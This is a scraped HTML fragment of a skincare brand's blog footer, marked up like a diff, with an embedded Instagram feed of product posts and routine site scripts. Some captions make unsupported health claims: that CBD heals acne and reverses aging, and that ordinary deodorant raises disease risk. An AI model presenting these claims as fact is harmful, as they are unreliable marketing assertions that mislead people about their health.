data-url="https://www.instagram.com/p/CEKJ0XKJtHE/" data-avatar="" data-account-type="business" data-wpel-link="external" target="_blank" rel="nofollow external">
+<span class="sbi-screenreader">Link to display lightbox</span>
+</a></div><a class="sbi_photo" href="https://www.instagram.com/p/CEKJ0XKJtHE/" target="_blank" rel="noopener noreferrer nofollow external" data-full-res="https://scontent-iad3-1.cdninstagram.com/v/t51.29350-15/118287796_320168332468068_5166777875633331576_n.jpg?_nc_cat=103&#038;_nc_sid=8ae9d6&#038;_nc_ohc=6Kiww58m9CgAX_BhI8T&#038;_nc_ht=scontent-iad3-1.cdninstagram.com&#038;oh=a4508924cf92d66ec5a6f7b45ba1da83&#038;oe=5F68DB88" data-img-src-set="{&quot;150&quot;:&quot;https:\/\/www.instagram.com\/p\/CEKJ0XKJtHE\/media?size=t&quot;,&quot;320&quot;:&quot;https:\/\/www.instagram.com\/p\/CEKJ0XKJtHE\/media?size=m&quot;,&quot;640&quot;:&quot;https:\/\/scontent-iad3-1.cdninstagram.com\/v\/t51.29350-15\/118287796_320168332468068_5166777875633331576_n.jpg?_nc_cat=103&amp;_nc_sid=8ae9d6&amp;_nc_ohc=6Kiww58m9CgAX_BhI8T&amp;_nc_ht=scontent-iad3-1.cdninstagram.com&amp;oh=a4508924cf92d66ec5a6f7b45ba1da83&amp;oe=5F68DB88&quot;}" data-wpel-link="external">
+<span class="sbi-screenreader">Instagram post 17846783873323000</span>
+<img src="https://i0.wp.com/null.null/wp-content/plugins/instagram-feed-pro/img/placeholder.png?resize=200%2C200&#038;ssl=1" alt="Struggling with acne or signs of aging? Here&#039;s the solution: CBD. ✨ This skin superfood not only soothes inflammation + helps heal hormonal acne, it provides *visible* results for aging skin. The potent antioxidants found in CBD Oil work to counteract free-radical damage helping to diminish fine lines, dullness and uneven skin tone. 🙌🏾 Anyone else out there as obsessed with CBD as we are?! . . . #primallypure #cleanbeauty #organicbeauty #greenbeauty #safeskincare #naturalbeauty #naturalskincare #nontoxic #beauty #healthyskin #selfcare #organicskincare #cbdoil #fullspectrumcbd #cbdinskincare #topicalcbd #naturalacnetreatment" width="200" height="200" data-recalc-dims="1">
+</a></div><div class="sbi_info"></div></div><div class="sbi_item sbi_type_image sbi_new sbi_transition" id="sbi_18021606037286573" data-date="1597937534" data-numcomments="13"> <div class="sbi_photo_wrap"> <div class="sbi_link sbi_disable_lightbox"> <div class="sbi_hover_top"> <p class="sbi_username"> <a href="https://instagram.com/primallypure" target="_blank" rel="noopener noreferrer nofollow external" style="color: rgba(255,255,255,1)" data-wpel-link="external">primallypure</a> </p></div><a class="sbi_instagram_link" href="https://www.instagram.com/p/CEHcNcMJUJb/" target="_blank" rel="noopener noreferrer nofollow external" title="Instagram" style="color: rgba(255,255,255,1)" data-wpel-link="external">
+<span class="sbi-screenreader">View on Instagram</span>
+<svg class="svg-inline--fa fa-instagram fa-w-14" aria-hidden="true" data-fa-processed="" data-prefix="fab" data-icon="instagram" role="img" viewBox="0 0 448 512">
+<path fill="currentColor" d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"></path>
+</svg>            </a>
+<div class="sbi_hover_bottom" style="color: rgba(255,255,255,1)"> <p> <span class="sbi_date"> <svg class="svg-inline--fa fa-clock fa-w-16" aria-hidden="true" data-fa-processed="" data-prefix="far" data-icon="clock" role="presentation" xmlns="https://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"></path></svg> Aug 20</span> </p></div><a class="sbi_link_area nofancybox" href="https://scontent-iad3-1.cdninstagram.com/v/t51.29350-15/117822952_167384154980503_8803726863455669459_n.jpg?_nc_cat=110&amp;_nc_sid=8ae9d6&amp;_nc_ohc=SWX7QiMZVz4AX_qDErP&amp;_nc_ht=scontent-iad3-1.cdninstagram.com&amp;oh=cd6d083e07afd769e7c78f891cc9e317&amp;oe=5F6A15B1" data-lightbox-sbi="" data-title="That&#039;s a lot of ingredients. 😳 Swapping out every single product can seem overwhelming (trust us, we&#039;ve been there!) so we suggest starting with the top offender: deodorant. 🙌🏾 Our bodies can often handle occasional chemicals BUT when exposed consistently (like swiping your drugstore deo daily), disease + health conditions are more likely to happen. 👉🏾 Making the simple swap to a clean deodorant can make a *major* difference in your health over the course of a lifetime. Have you made the swap? We&#039;d love to hear how it&#039;s made a difference in your life below! 🖤 . . . #primallypure #pureifyyourpits #cleanbeauty #organicdeodorant #greenbeauty #safeskincare #naturaldeodorant #naturalskincare #nontoxicdeodorant #healthyskin #healthyself #maketheswap" data-video="" data-carousel="" data-id="sbi_18021606037286573" data-user="primallypure" data-url="https://www.instagram.com/p/CEHcNcMJUJb/" data-avatar="" data-account-type="business" data-wpel-link="external" target="_blank" rel="nofollow external">
+<span class="sbi-screenreader">Link to display lightbox</span>
+</a></div><a class="sbi_photo" href="https://www.instagram.com/p/CEHcNcMJUJb/" target="_blank" rel="noopener noreferrer nofollow external" data-full-res="https://scontent-iad3-1.cdninstagram.com/v/t51.29350-15/117822952_167384154980503_8803726863455669459_n.jpg?_nc_cat=110&#038;_nc_sid=8ae9d6&#038;_nc_ohc=SWX7QiMZVz4AX_qDErP&#038;_nc_ht=scontent-iad3-1.cdninstagram.com&#038;oh=cd6d083e07afd769e7c78f891cc9e317&#038;oe=5F6A15B1" data-img-src-set="{&quot;150&quot;:&quot;https:\/\/www.instagram.com\/p\/CEHcNcMJUJb\/media?size=t&quot;,&quot;320&quot;:&quot;https:\/\/www.instagram.com\/p\/CEHcNcMJUJb\/media?size=m&quot;,&quot;640&quot;:&quot;https:\/\/scontent-iad3-1.cdninstagram.com\/v\/t51.29350-15\/117822952_167384154980503_8803726863455669459_n.jpg?_nc_cat=110&amp;_nc_sid=8ae9d6&amp;_nc_ohc=SWX7QiMZVz4AX_qDErP&amp;_nc_ht=scontent-iad3-1.cdninstagram.com&amp;oh=cd6d083e07afd769e7c78f891cc9e317&amp;oe=5F6A15B1&quot;}" data-wpel-link="external">
+<span class="sbi-screenreader">Instagram post 18021606037286573</span>
+<img src="https://i0.wp.com/null.null/wp-content/plugins/instagram-feed-pro/img/placeholder.png?resize=200%2C200&#038;ssl=1" alt="That&#039;s a lot of ingredients. 😳 Swapping out every single product can seem overwhelming (trust us, we&#039;ve been there!) so we suggest starting with the top offender: deodorant. 🙌🏾 Our bodies can often handle occasional chemicals BUT when exposed consistently (like swiping your drugstore deo daily), disease + health conditions are more likely to happen. 👉🏾 Making the simple swap to a clean deodorant can make a *major* difference in your health over the course of a lifetime. Have you made the swap? We&#039;d love to hear how it&#039;s made a difference in your life below! 🖤 . . . #primallypure #pureifyyourpits #cleanbeauty #organicdeodorant #greenbeauty #safeskincare #naturaldeodorant #naturalskincare #nontoxicdeodorant #healthyskin #healthyself #maketheswap" width="200" height="200" data-recalc-dims="1">
+</a></div><div class="sbi_info"></div></div><div class="sbi_item sbi_type_video sbi_new sbi_transition" id="sbi_17850602531232673" data-date="1597772265" data-numcomments="8"> <div class="sbi_photo_wrap"> <svg style="color: rgba(255,255,255,1)" class="svg-inline--fa fa-play fa-w-14 sbi_playbtn" aria-hidden="true" data-fa-processed="" data-prefix="fa" data-icon="play" role="presentation" xmlns="https://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M424.4 214.7L72.4 6.6C43.8-10.3 0 6.1 0 47.9V464c0 37.5 40.7 60.1 72.4 41.3l352-208c31.4-18.5 31.5-64.1 0-82.6z"></path></svg> <div class="sbi_link sbi_disable_lightbox"> <div class="sbi_hover_top"> <p class="sbi_username"> <a href="https://instagram.com/primallypure" target="_blank" rel="noopener noreferrer nofollow external" style="color: rgba(255,255,255,1)" data-wpel-link="external">primallypure</a> </p></div><a class="sbi_instagram_link" href="https://www.instagram.com/p/CECg7HHptJ1/" target="_blank" rel="noopener noreferrer nofollow external" title="Instagram" style="color: rgba(255,255,255,1)" data-wpel-link="external">
+<span class="sbi-screenreader">View on Instagram</span>
+<svg class="svg-inline--fa fa-instagram fa-w-14" aria-hidden="true" data-fa-processed="" data-prefix="fab" data-icon="instagram" role="img" viewBox="0 0 448 512">
+<path fill="currentColor" d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"></path>
+</svg>            </a>
+<div class="sbi_hover_bottom" style="color: rgba(255,255,255,1)"> <p> <span class="sbi_date"> <svg class="svg-inline--fa fa-clock fa-w-16" aria-hidden="true" data-fa-processed="" data-prefix="far" data-icon="clock" role="presentation" xmlns="https://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"></path></svg> Aug 18</span> </p></div><a class="sbi_link_area nofancybox" href="https://scontent-iad3-1.cdninstagram.com/v/t51.29350-15/117677358_355066652562851_2698277132766112137_n.jpg?_nc_cat=109&amp;_nc_sid=8ae9d6&amp;_nc_ohc=3MVZ8lAfLQwAX_DwgrL&amp;_nc_ht=scontent-iad3-1.cdninstagram.com&amp;oh=624ed94d2a0e0adb9dea6b87fca571d8&amp;oe=5F6B6A85" data-lightbox-sbi="" data-title="Diffusing daily: Summer Oil Blend. ☀️ Because 2020. . . . #primallypure #pureingredientsrealresults #nontoxichome #naturalhomeproducts #organichomeproducts #organichandsoap #essentialoilblend #essentialoildiffuserblend #organicroomspray #welcomehome" data-video="https://video-iad3-1.cdninstagram.com/v/t50.2886-16/118086859_624110891841868_6747231283797634692_n.mp4?_nc_cat=100&amp;vs=18098997571171665_487535596&amp;_nc_vs=HBkcFQAYJEdNdmNDUWRNT1FJa29EY0NBSVF1S2JBYV82SmRia1lMQUFBRhUAAsgBACgAGAAbAYgHdXNlX29pbAExFQAAGAAWosC05ae8pkAVAigCQzMsF0A3EOVgQYk3GBJkYXNoX2Jhc2VsaW5lXzFfdjERAHXqBwA%3D&amp;_nc_sid=59939d&amp;efg=eyJ2ZW5jb2RlX3RhZyI6InZ0c192b2RfdXJsZ2VuLjcyMC5mZWVkIn0%3D&amp;_nc_ohc=vxNBL17xakcAX9kyBfY&amp;_nc_ht=video-iad3-1.cdninstagram.com&amp;oh=354b1263bfafa7b2e7bbc4d148e697ae&amp;oe=5F68E4FA&amp;_nc_rid=c8fdc96fc4" data-carousel="" data-id="sbi_17850602531232673" data-user="primallypure" data-url="https://www.instagram.com/p/CECg7HHptJ1/" data-avatar="" data-account-type="business" data-wpel-link="external" target="_blank" rel="nofollow external">
+<span class="sbi-screenreader">Link to display lightbox</span>
+<svg style="color: rgba(255,255,255,1)" class="svg-inline--fa fa-play fa-w-14 sbi_playbtn" aria-hidden="true" data-fa-processed="" data-prefix="fa" data-icon="play" role="presentation" xmlns="https://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M424.4 214.7L72.4 6.6C43.8-10.3 0 6.1 0 47.9V464c0 37.5 40.7 60.1 72.4 41.3l352-208c31.4-18.5 31.5-64.1 0-82.6z"></path></svg>            </a></div><a class="sbi_photo" href="https://www.instagram.com/p/CECg7HHptJ1/" target="_blank" rel="noopener noreferrer nofollow external" data-full-res="https://scontent-iad3-1.cdninstagram.com/v/t51.29350-15/117677358_355066652562851_2698277132766112137_n.jpg?_nc_cat=109&#038;_nc_sid=8ae9d6&#038;_nc_ohc=3MVZ8lAfLQwAX_DwgrL&#038;_nc_ht=scontent-iad3-1.cdninstagram.com&#038;oh=624ed94d2a0e0adb9dea6b87fca571d8&#038;oe=5F6B6A85" data-img-src-set="{&quot;150&quot;:&quot;https:\/\/www.instagram.com\/p\/CECg7HHptJ1\/media?size=t&quot;,&quot;320&quot;:&quot;https:\/\/www.instagram.com\/p\/CECg7HHptJ1\/media?size=m&quot;,&quot;640&quot;:&quot;https:\/\/www.instagram.com\/p\/CECg7HHptJ1\/media?size=l&quot;}" data-wpel-link="external">
+<span class="sbi-screenreader">Instagram post 17850602531232673</span>
+<img src="https://i0.wp.com/null.null/wp-content/plugins/instagram-feed-pro/img/placeholder.png?resize=200%2C200&#038;ssl=1" alt="Diffusing daily: Summer Oil Blend. ☀️ Because 2020. . . . #primallypure #pureingredientsrealresults #nontoxichome #naturalhomeproducts #organichomeproducts #organichandsoap #essentialoilblend #essentialoildiffuserblend #organicroomspray #welcomehome" width="200" height="200" data-recalc-dims="1">
+</a></div><div class="sbi_info"></div></div><div class="sbi_item sbi_type_image sbi_new sbi_transition" id="sbi_17863175048050330" data-date="1597683499" data-numcomments="14"> <div class="sbi_photo_wrap"> <div class="sbi_link sbi_disable_lightbox"> <div class="sbi_hover_top"> <p class="sbi_username"> <a href="https://instagram.com/primallypure" target="_blank" rel="noopener noreferrer nofollow external" style="color: rgba(255,255,255,1)" data-wpel-link="external">primallypure</a> </p></div><a class="sbi_instagram_link" href="https://www.instagram.com/p/CD_3rV3pkp4/" target="_blank" rel="noopener noreferrer nofollow external" title="Instagram" style="color: rgba(255,255,255,1)" data-wpel-link="external">
+<span class="sbi-screenreader">View on Instagram</span>
+<svg class="svg-inline--fa fa-instagram fa-w-14" aria-hidden="true" data-fa-processed="" data-prefix="fab" data-icon="instagram" role="img" viewBox="0 0 448 512">
+<path fill="currentColor" d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"></path>
+</svg>            </a>
+<div class="sbi_hover_bottom" style="color: rgba(255,255,255,1)"> <p> <span class="sbi_date"> <svg class="svg-inline--fa fa-clock fa-w-16" aria-hidden="true" data-fa-processed="" data-prefix="far" data-icon="clock" role="presentation" xmlns="https://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"></path></svg> Aug 17</span> </p></div><a class="sbi_link_area nofancybox" href="https://scontent-iad3-1.cdninstagram.com/v/t51.29350-15/117649968_241778776912354_6338570844521953504_n.jpg?_nc_cat=104&amp;_nc_sid=8ae9d6&amp;_nc_ohc=CPN7NF0gqc4AX_4YM_P&amp;_nc_ht=scontent-iad3-1.cdninstagram.com&amp;oh=6df41fa91e353f355d3dc608e5ee0a29&amp;oe=5F6957B5" data-lightbox-sbi="" data-title="Friendly reminder, PP fam! Your fav deodorant is 1/2 off when you join our deo subscription family this month. 🙌🏾 Sign up for his and hers or treat yourself to two! Not sure which scent to pick? 👉🏾 Take our fun, quick Deodorant Quiz (link in bio) to find out the best scent for you. Tell our team below what scent you subscribed to! . . . #primallypure #pureifyyourpits #cleanbeauty #organicdeodorant #greenbeauty #safeskincare #naturaldeodorant #naturalskincare #nontoxicdeodorant #healthyskin #healthyself" data-video="" data-carousel="" data-id="sbi_17863175048050330" data-user="primallypure" data-url="https://www.instagram.com/p/CD_3rV3pkp4/" data-avatar="" data-account-type="business" data-wpel-link="external" target="_blank" rel="nofollow external">
+<span class="sbi-screenreader">Link to display lightbox</span>
+</a></div><a class="sbi_photo" href="https://www.instagram.com/p/CD_3rV3pkp4/" target="_blank" rel="noopener noreferrer nofollow external" data-full-res="https://scontent-iad3-1.cdninstagram.com/v/t51.29350-15/117649968_241778776912354_6338570844521953504_n.jpg?_nc_cat=104&#038;_nc_sid=8ae9d6&#038;_nc_ohc=CPN7NF0gqc4AX_4YM_P&#038;_nc_ht=scontent-iad3-1.cdninstagram.com&#038;oh=6df41fa91e353f355d3dc608e5ee0a29&#038;oe=5F6957B5" data-img-src-set="{&quot;150&quot;:&quot;https:\/\/www.instagram.com\/p\/CD_3rV3pkp4\/media?size=t&quot;,&quot;320&quot;:&quot;https:\/\/www.instagram.com\/p\/CD_3rV3pkp4\/media?size=m&quot;,&quot;640&quot;:&quot;https:\/\/scontent-iad3-1.cdninstagram.com\/v\/t51.29350-15\/117649968_241778776912354_6338570844521953504_n.jpg?_nc_cat=104&amp;_nc_sid=8ae9d6&amp;_nc_ohc=CPN7NF0gqc4AX_4YM_P&amp;_nc_ht=scontent-iad3-1.cdninstagram.com&amp;oh=6df41fa91e353f355d3dc608e5ee0a29&amp;oe=5F6957B5&quot;}" data-wpel-link="external">
+<span class="sbi-screenreader">Instagram post 17863175048050330</span>
+<img src="https://i0.wp.com/null.null/wp-content/plugins/instagram-feed-pro/img/placeholder.png?resize=200%2C200&#038;ssl=1" alt="Friendly reminder, PP fam! Your fav deodorant is 1/2 off when you join our deo subscription family this month. 🙌🏾 Sign up for his and hers or treat yourself to two! Not sure which scent to pick? 👉🏾 Take our fun, quick Deodorant Quiz (link in bio) to find out the best scent for you. Tell our team below what scent you subscribed to! . . . #primallypure #pureifyyourpits #cleanbeauty #organicdeodorant #greenbeauty #safeskincare #naturaldeodorant #naturalskincare #nontoxicdeodorant #healthyskin #healthyself" width="200" height="200" data-recalc-dims="1">
+</a></div><div class="sbi_info"></div></div></div><div id="sbi_load"></div><span class="sbi_resized_image_data" data-feed-id="sbi_primallypure#7" data-resized="{&quot;17850602531232673&quot;:{&quot;id&quot;:&quot;117677358_355066652562851_2698277132766112137_n&quot;,&quot;ratio&quot;:&quot;1.00&quot;,&quot;sizes&quot;:{&quot;full&quot;:640,&quot;low&quot;:320}},&quot;17863175048050330&quot;:{&quot;id&quot;:&quot;117649968_241778776912354_6338570844521953504_n&quot;,&quot;ratio&quot;:&quot;1.00&quot;,&quot;sizes&quot;:{&quot;full&quot;:640,&quot;low&quot;:320}},&quot;17855226614179696&quot;:{&quot;id&quot;:&quot;118175786_678111772796200_4099086629234004139_n&quot;,&quot;ratio&quot;:&quot;1.00&quot;,&quot;sizes&quot;:{&quot;full&quot;:640,&quot;low&quot;:320}},&quot;18113145214145508&quot;:{&quot;id&quot;:&quot;118168987_125707498919818_2287496421118795661_n&quot;,&quot;ratio&quot;:&quot;1.00&quot;,&quot;sizes&quot;:{&quot;full&quot;:640,&quot;low&quot;:320}},&quot;17874853057843131&quot;:{&quot;id&quot;:&quot;117972026_440602593563699_1901467719348931061_n&quot;,&quot;ratio&quot;:&quot;1.00&quot;,&quot;sizes&quot;:{&quot;full&quot;:640,&quot;low&quot;:320}},&quot;17846783873323000&quot;:{&quot;id&quot;:&quot;118287796_320168332468068_5166777875633331576_n&quot;,&quot;ratio&quot;:&quot;1.00&quot;,&quot;sizes&quot;:{&quot;full&quot;:640,&quot;low&quot;:320}},&quot;18021606037286573&quot;:{&quot;id&quot;:&quot;117822952_167384154980503_8803726863455669459_n&quot;,&quot;ratio&quot;:&quot;1.00&quot;,&quot;sizes&quot;:{&quot;full&quot;:640,&quot;low&quot;:320}}}">
+</span></div><script>var sb_instagram_js_options={"font_method":"svg","placeholder":"https:\/\/null.null\/wp-content\/plugins\/instagram-feed-pro\/img\/placeholder.png","resized_url":"https:\/\/null.null\/wp-content\/uploads\/sb-instagram-feed-images\/","br_adjust":true};</script><script type='text/javascript' src='https://null.null/wp-content/plugins/instagram-feed-pro/js/sb-instagram.js?ver=5.0'></script></div></article>
+</footer>
+<footer class="footer" id="footer" itemscope itemtype="http://schema.org/WPFooter">
+<section class="footer-inner-wrap">
+<footer class="footer-inner" role="complementary">
+<section class="footer-inner-column-left">
+<div class="footer-inner-padding"> <section class="footer-widget widget widget_text" id="text-8"><h4>Pure ingredients, real results.</h4> <div class="textwidget"><p>We believe in the power of self care, intentional living and daily baths. Our products are made from nature&#8217;s most precious elements that help to support radiant skin, a healthy body and a happy self. Shop our line of 100% natural skincare products <a style="text-decoration: underline;" href="https://primallypure.com/collections/primally-pure" data-wpel-link="external" target="_blank" rel="nofollow external">here</a>.</p></div></section></div></section>
+<section class="footer-inner-column-right">
+<section class="footer-inner-column-right-top">
+<section class="top-left">
+<div class="footer-inner-padding"> <section class="footer-widget widget widget_text" id="text-9"><h4>contact</h4> <div class="textwidget"><p><a href="mailto:hello@primallypure.com">hello@primallypure.com</a></p></div></section></div></section>
+<section class="top-right">
+<div class="footer-inner-padding"> <section class="footer-widget widget widget_text" id="text-10"><h4>About</h4> <div class="textwidget"><p>Learn more about our <a href="https://primallypure.com/pages/about-us" style="text-decoration: underline" data-wpel-link="external" target="_blank" rel="nofollow external">story</a>.</p></div></section></div></section>
+</section>
+<section class="footer-inner-column-right-bottom">
+<div class="footer-inner-padding"> <section class="ace-social-icons-wrap"> <h6 class="ace-social-icons-title">Follow Along</h6> <ul class="ace-social-icons"> <li><a href="http://www.facebook.com/primallypure" class="fa fa-facebook radius-50" data-wpel-link="external" target="_blank" rel="nofollow external"><span>Facebook</span></a></li> <li><a href="https://www.pinterest.com/primallypure/" class="fa fa-pinterest-p radius-50" data-wpel-link="external" target="_blank" rel="nofollow external"><span>Pinterest</span></a></li> <li><a href="https://instagram.com/primallypure/" class="fa fa-instagram radius-50" data-wpel-link="external" target="_blank" rel="nofollow external"><span>Instagram</span></a></li> </ul> </section></div></section>
+</section>
+</footer>
+</section>
+</footer>
+</section>
+<script src="//ajax.googleapis.com/ajax/libs/webfont/1.4.7/webfont.js"></script>
+<script>var googleFonts=[];
+googleFonts.push('Work+Sans:300,400,500,700');
+googleFonts.push('Capriola:400');
+if(googleFonts.length){
+WebFont.load({
+google: {
+families: googleFonts
+}});
+}</script>
+<script>var sbiajaxurl="https://null.null/wp-admin/admin-ajax.php";</script>
+<div style="display:none"> <div class="grofile-hash-map-f0c7a02943b1f33ec1b94666e0ee9800"></div><div class="grofile-hash-map-b03c22046b202f3a1c43c6db0e4703ed"></div><div class="grofile-hash-map-6fd515657b843062f9be108c95ed51e4"></div></div><script type="text/javascript" src="https://a.optmnstr.com/app/js/api.min.js" data-campaign="j5xdcnyzcnmi7vaw4q28" data-user="53088" data-env="production"></script><script type="text/javascript" src="https://a.optmnstr.com/app/js/api.min.js" data-campaign="lprqwar7i9fem0zgkrdc" data-user="53088" data-env="production"></script><script type="text/javascript" src="https://a.optmnstr.com/app/js/api.min.js" data-campaign="nzyly74hgc1lspzhwp5u" data-user="53088" data-env="production"></script>
+<script>window.WPCOM_sharing_counts={"https:\/\/null.null\/i-broke-up-with-my-toxic-deodorant-heres-how-i-did-it\/":6632};</script>
+<script>var j5xdcnyzcnmi7vaw4q28_shortcode=true;var lprqwar7i9fem0zgkrdc_shortcode=true;var nzyly74hgc1lspzhwp5u_shortcode=true;</script>
+<script type='text/javascript' src='https://null.null/wp-content/plugins/jetpack/_inc/build/photon/photon.min.js' id='jetpack-photon-js'></script>
+<script id='jpibfi-script-js-extra'>var jpibfi_options={"hover":{"siteTitle":"The Primally Pure Skincare Blog","image_selector":".jpibfi_container img","disabled_classes":"wp-smiley; nopin; flexslider; flexslides; flexslides li img","enabled_classes":"","min_image_height":350,"min_image_height_small":350,"min_image_width":350,"min_image_width_small":350,"show_on":"[front],[single],[page],[archive],[search],[category],https:\/\/null.null","disable_on":"[home]","show_button":"hover","button_margin_bottom":20,"button_margin_top":20,"button_margin_left":20,"button_margin_right":20,"button_position":"middle","description_option":["img_title","img_alt","post_title"],"transparency_value":0,"pin_image":"custom","pin_image_button":"square","pin_image_icon":"circle","pin_image_size":"normal","custom_image_url":"https:\/\/null.null\/wp-content\/uploads\/2017\/05\/PP_Pin_Button_@2x_opt.3.png","scale_pin_image":false,"pin_linked_url":true,"pinLinkedImages":true,"pinImageWidth":172,"pinImageHeight":172,"scroll_selector":"","support_srcset":false}};</script>
+<script type='text/javascript' src='https://null.null/wp-content/plugins/jquery-pin-it-button-for-images/js/jpibfi.client.js' id='jpibfi-script-js'></script>
+<script type='text/javascript' src='https://null.null/wp-includes/js/imagesloaded.min.js' id='imagesloaded-js'></script>
+<script type='text/javascript' src='https://null.null/wp-includes/js/masonry.min.js' id='masonry-js'></script>
+<script type='text/javascript' src='https://null.null/wp-includes/js/jquery/jquery.masonry.min.js' id='jquery-masonry-js'></script>
+<script type='text/javascript' src='https://null.null/wp-content/plugins/simple-masonry-layout/js/imagesloaded.js' id='imagesloaded-script-js'></script>
+<script type='text/javascript' src='https://null.null/wp-content/plugins/simple-masonry-layout/js/classie.js' id='classie-script-js'></script>
+<script type='text/javascript' src='https://null.null/wp-content/plugins/simple-masonry-layout/js/AnimOnScroll.js' id='AnimOnScroll-script-js'></script>
+<script type='text/javascript' src='https://null.null/wp-content/plugins/simple-masonry-layout/js/main.js' id='main-script-js'></script>
+<script type='text/javascript' src='https://null.null/wp-content/plugins/simple-masonry-layout/js/darkbox.js' id='darkbox-script-js'></script>
+<script type='text/javascript' src='https://null.null/wp-includes/js/comment-reply.min.js' id='comment-reply-js'></script>
